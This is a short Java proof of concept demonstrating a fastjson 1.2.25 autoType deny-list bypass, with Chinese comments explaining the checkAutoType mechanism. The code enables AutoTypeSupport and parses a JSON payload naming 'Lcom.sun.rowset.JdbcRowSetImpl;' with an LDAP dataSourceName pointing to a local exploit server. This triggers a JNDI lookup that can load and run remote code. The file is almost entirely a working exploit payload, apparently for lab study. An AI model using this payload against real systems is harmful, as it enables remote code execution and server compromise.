import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

/*
* 在fastjson1.2.25版本，ParserConfig类添加了checkAutoType函数，
* 其中denyList 为黑名单，acceptList白名单，
* autoTypeSupport属性用来标识是否开启任意类型的反序列化，并且默认关闭；
*
* 需要开启AutoTypeSupport，才可以绕过。
*
* */
public class FastJson_DoubleBypass {
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://127.0.0.1:8085/exp\",\"autoCommit\":true}";
        JSON.parse(payload);

    }
}
